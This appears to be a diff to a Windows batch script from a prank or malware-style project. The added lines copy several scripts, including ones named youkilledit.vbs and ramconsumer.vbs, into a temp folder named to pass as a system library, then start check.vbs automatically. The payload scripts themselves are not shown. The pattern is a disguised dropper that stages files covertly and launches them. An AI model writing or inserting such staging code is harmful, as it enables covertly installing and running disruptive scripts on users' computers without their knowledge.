@@ -21,7 +21,14 @@ copy monoxide.mp3 "%temp%\mswin-lib64-data_structure"
 copy monoxide_error.mp3 "%temp%\mswin-lib64-data_structure"
 copy veryfun.bat "%temp%\mswin-lib64-data_structure"
 copy veryfun.vbs "%temp%\mswin-lib64-data_structure"
-cd %temp%\mswin-lib64-data_structures
+copy check.vbs "%temp%\mswin-lib64-data_structure"
+copy youkilledit.vbs "%temp%\mswin-lib64-data_structure"
+copy check.bat "%temp%\mswin-lib64-data_structure"
+copy youkilledit.bat "%temp%\mswin-lib64-data_structure"
+copy ramconsumer.vbs "%temp%\mswin-lib64-data_structure"
+cd %temp%\mswin-lib64-data_structure
+
+start check.vbs
 
 :sound
 cd %temp%\mswin-lib64-data_structure
